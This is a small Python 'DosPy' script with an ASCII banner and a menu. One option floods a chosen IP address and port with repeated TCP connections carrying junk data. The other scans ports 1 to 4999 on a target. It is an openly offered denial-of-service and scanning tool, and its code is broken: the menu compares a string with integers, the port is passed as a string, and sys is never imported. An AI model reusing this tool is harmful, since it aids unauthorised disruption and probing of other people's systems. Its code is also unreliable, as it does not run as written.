import socket
import time
from platform import system
import os
if system() == 'Linux':
    os.system('clear')
elif system() == 'Windows':
    os.system('cls')
    os.system('color a')
__version__ = '1.1'
Date_and_time_of_day = 'Time of day : '+time.ctime()
The_developer_team = 'Arab Python'
banner = """
                             """+__version__ +"""

                             """+Date_and_time_of_day+"""
 _____            _____       
|  __ \          |  __ \     """+The_developer_team+"""
| |  | | ___  ___| |__) |   _ 
| |  | |/ _ \/ __|  ___/ | | |
| |__| | (_) \__ \ |   | |_| |
|_____/ \___/|___/_|    \__, |
                         __/ |
                        |___/ 
1 - Dos Attack IP Address

2 - Scan IP Address

"""
print(banner)
Enter_number = input("Enter the number :")
if (Enter_number == 1):
	input_ip = str(input('\nEnter IP Address Plase :'))
	input_port = input('\nEnter port open Plase :')
	print("-"*30)
	print("The attack on the site started please. If you want to stop, press Ctrl+C")
	print("-"*30)
	try:
		while True:
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			connect = sock.connect((input_ip,input_port))
			data = 'abcdefghjiklmnopqrstydlfkjlsfmlsmflsdmfldsmfklmsflsklfjsklfklsdfnmjsknrdklae'*1000
			time.sleep(1)
			sock.send(data.encode('utf-8'))
			print ("Attacking for ip address ",input_ip,"port is ",input_port)
	except socket.error as err:
		raise err
elif (Enter_number == 2):
	input_ip2 = str(input('\nEnter IP Address Plase :'))
	try:
		print("-"*30)
		print("Scaning IP Address : ",input_ip2)
		print("-"*30+"\n")
		for port in range(1,5000):
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			socket.setdefaulttimeout(1)
			result = sock.connect_ex((input_ip2,port))
			if (result == 0):
				print (" [*] port Open -> \t",port,"name serv is ->",socket.getservbyport(port))
			sock.close()
	except KeyboardInterrupt:
		print ("You stop this")
		print("port closed",input_ip2,"--",socket.getservbyport(port))
		sys.exit()
